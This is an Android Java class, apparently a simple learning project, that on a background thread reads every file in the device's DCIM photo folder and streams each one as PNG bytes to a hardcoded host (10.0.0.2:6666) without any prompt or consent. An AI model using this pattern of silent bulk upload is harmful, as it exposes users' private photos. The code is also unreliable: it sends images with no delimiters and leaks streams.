package com.example.owner.myapplication;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;

public class TcpConnection {
    public void startConnection() {

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {

                try {
                    InetAddress serverAddr = InetAddress.getByName("10.0.0.2");

                    Socket socket = new Socket(serverAddr, 6666);
                    try {
                        OutputStream output = socket.getOutputStream();

                        File DCIM = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                        if (DCIM == null) {
                            return;
                        }
                        File[] pics = DCIM.listFiles();
                        int count = 0;
                        if (pics != null) {
                            for (File pic : pics) {

                                FileInputStream fis = new FileInputStream(pic);
                                Bitmap bitmap = BitmapFactory.decodeStream(fis);
                                byte[] imgByte = getBytesFromBitmap(bitmap);

                                output.write(imgByte);
                                output.flush();
                                ++count;
                            }
                        }
                    } catch (Exception e) {
                        Log.e("TCP", "C: Error", e);
                    } finally {
                        socket.close();
                    }

                } catch (Exception e) {
                    Log.e("TCP", "C: Error", e);
                }
            }
        });
        thread.start();
    }

    private byte[] getBytesFromBitmap(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.PNG, 70, stream);
        return stream.toByteArray();
    }
}




